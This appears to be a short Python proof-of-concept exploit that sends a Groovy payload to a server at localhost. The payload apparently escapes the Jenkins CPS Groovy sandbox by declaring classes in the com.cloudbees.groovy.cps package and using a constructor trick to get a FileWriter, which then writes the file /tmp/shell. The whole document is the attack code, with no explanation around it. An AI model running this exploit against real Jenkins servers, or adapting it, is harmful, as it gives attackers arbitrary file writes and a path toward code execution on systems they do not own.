from time import sleep

import requests

url = 'http://localhost/'
exp = '''
package com.cloudbees.groovy.cps
class SerializableScript {
  def x
  SerializableScript(FileWriter f) { this.x = f }
}
class Subclass extends SerializableScript {
  Subclass() { super(['/tmp/shell']) }
}
def e=new Subclass().x
e.write("horse")
e.close()
'''

r = requests.get(url, data=exp)
print(r.text)
